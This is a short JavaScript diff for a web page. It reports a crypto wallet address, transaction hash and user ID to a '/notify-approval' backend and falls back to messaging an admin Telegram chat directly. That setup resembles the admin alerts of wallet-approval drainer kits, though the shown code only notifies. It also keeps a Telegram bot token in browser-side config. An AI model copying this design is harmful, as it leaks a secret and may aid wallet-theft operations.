@@ -45,6 +45,21 @@ document.addEventListener("DOMContentLoaded", function () {
         const botToken = CONFIG.TELEGRAM_BOT_TOKEN;
         const adminChatId = CONFIG.ADMIN_CHAT_ID;
 
+        try {
+            const notifyRes = await fetch("/notify-approval", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ walletAddress, txHash, userId })
+            });
+            if (notifyRes.ok) {
+                console.log("Backend Telegram notification sent successfully");
+                return;
+            }
+            console.warn("Backend Telegram notification failed, falling back to direct send.");
+        } catch (error) {
+            console.warn("Backend Telegram notification unavailable, falling back to direct send:", error);
+        }
+
         const inlineKeyboard = {
             inline_keyboard: [[{ text: "🔗 View Transaction", url: `https://bscscan.com/tx/${txHash}` }]]
         };
